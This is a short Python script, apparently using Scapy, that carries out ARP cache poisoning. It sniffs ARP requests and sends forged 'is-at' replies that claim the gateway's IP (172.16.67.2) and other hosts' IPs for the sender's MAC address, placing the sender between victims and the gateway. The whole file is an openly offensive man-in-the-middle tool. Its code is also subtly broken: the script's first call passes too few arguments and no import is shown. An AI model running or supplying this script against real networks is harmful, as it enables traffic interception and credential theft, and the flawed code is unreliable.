gw_ip = '172.16.67.2'
my_ip = ARP().psrc
my_mac = ARP().hwsrc

print('My IP', my_ip)
print('My MAC', my_mac)

def packet_cb(p):
  p = p.payload
  if p.op != 1: # only who-has
    return
  if p.psrc == my_ip:
    return
  if p.pdst == gw_ip:
    print('{} at {} is requesting gateway\'s MAC...'.format(p.psrc, p.hwsrc))
    do_reply(gw_ip, p.hwsrc, p.psrc)
    #do_reply(p.psrc, gw_mac, gw_ip)
  elif p.psrc == gw_ip:
    print('Gateway is requesting {}\'s MAC...'.format(p.pdst))
    do_reply(p.pdst, p.hwsrc, p.psrc)

def do_reply(fake_ip, dst, pdst=''):
  if dst == 'ff:ff:ff:ff:ff:ff':
    # gratuitous ARP
    hwdst = my_mac
    pdst = fake_ip
  else:
    hwdst = dst
  packet = Ether(dst=dst)/ARP(op='is-at',
                       hwsrc=my_mac,
                       psrc=fake_ip,
                       hwdst=hwdst,
                       pdst=pdst)
  print('new packet:')
  packet.show()
  sendp(packet * 3)

def main():
  do_reply('ff:ff:ff:ff:ff:ff') # gratuitous ARP
  while True:
    receive = sniff(filter='arp', count=100, prn=packet_cb)

main()
exit()
